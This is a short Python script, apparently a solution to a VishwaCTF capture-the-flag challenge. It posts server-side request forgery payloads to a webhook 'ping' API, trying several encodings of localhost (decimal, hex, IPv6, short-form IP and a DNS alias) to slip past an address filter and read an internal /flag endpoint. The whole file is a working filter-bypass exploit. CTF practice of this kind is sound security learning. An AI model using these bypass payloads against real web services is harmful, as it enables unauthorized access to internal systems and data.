#!/usr/bin/env python3
import requests
import time

BASE = "https://ping.vishwactf.com"

# Try all bypass techniques rapidly
bypasses = [
    ("http://2130706433:8080/flag", "decimal IP"),
    ("http://0x7f000001:8080/flag", "hex IP"),
    ("http://[::1]:8080/flag", "IPv6"),
    ("http://127.1:8080/flag", "short form"),
    ("http://localtest.me:8080/flag", "DNS trick"),
]

for url, desc in bypasses:
    print(f"[*] {desc}: {url}")
    r = requests.post(f"{BASE}/api/ping", json={"webhook_url": url})
    res = r.json()
    if res.get('success') and res.get('preview'):
        if "VishwaCTF{" in res['preview']:
            print(f"[!!!] FLAG: {res['preview']}")
            break
    print(f"    {res.get('error', res.get('status'))}")
    time.sleep(0.2)
